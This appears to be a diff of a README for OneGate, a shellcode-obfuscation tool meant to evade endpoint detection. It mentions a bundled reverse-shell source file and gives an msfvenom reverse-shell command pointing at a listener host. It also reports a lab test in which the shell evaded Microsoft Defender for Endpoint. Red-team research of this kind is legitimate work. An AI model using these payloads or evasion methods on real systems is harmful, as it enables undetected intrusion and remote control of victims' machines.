@@ -49,7 +49,7 @@ OneGate takes a **LOOOOONG** time to run payloads, so be patient after you launc
 
 There are two `.c` files in the Executor project folder. One is an example with running calc.exe and the other is a reverse shell. You will need to set one as "Exclude From Project" otherwise it will not compile.
 
-#### Shortfall of deobfusaction technique
+### Shortfall of deobfusaction technique
 
 One shortfall of this technique is that unless the RIP points to a particular instruction it will not be deobfuscated. For example the last few instructions of `msfvenom -p windows/x64/exec CMD=calc.exe` are:
 ```
@@ -79,7 +79,7 @@ A better way to handle this could be just in time deobfuscation, where there is 
 
 This was tested in [Altered Security](https://www.alteredsecurity.com/)'s lab environment (shout out to Nikhil for letting me test it on there) which had a machine running Microsoft Defender for Endpoint (Microsoft's EDR solution). OneGate was infiltrated to the target machine and run from disk without using any sort of in memory PE loading techniques. Using the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.91 LPORT=9000` built on `notepad.exe` a reverse connection was successfully established to the listener machine.
 
-[placeholder_for_image]
+<img src="./pictures/rev_shell_connect.png" alt="Image" width="600">
 
 An analysis of the MDE dashboard shows only one detection by MDE which had to do with a compromised account and the dumping of a SAM hive (this was a shared environment so other people were doing other things). Of interest is the fact that MDE had flagged the `jumpone$` account shown in the picture below as being compromised - this was the same account used to sign in to deploy OneGate on the target machine meaning that even with a flagged account MDE did not detect the execution of the reverse shell.
 
